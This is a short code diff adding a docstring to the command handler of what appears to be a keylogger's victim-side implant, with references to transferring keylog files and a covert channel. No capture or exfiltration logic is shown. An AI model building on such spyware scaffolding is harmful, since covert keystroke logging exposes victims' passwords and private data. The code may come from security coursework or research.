@@ -8,6 +8,18 @@ from utils import get_ip_address, transfer_keylog_file, check_exists
 import shutil
 
 def handle_command(command: int, keylogger, watcher, covert):
+    """
+    Handle the received command.
+
+    Args:
+        command (int): Received command.
+        keylogger (Keylogger): Keylogger instance.
+        watcher (Watcher): Watcher instance.
+        covert (CovertChannel): Covert channel instance.
+
+    Returns:
+        int: Result code.
+    """
     if command == 0:
         return 0
     print(f"VICTIM:: Command Received", end=" ")
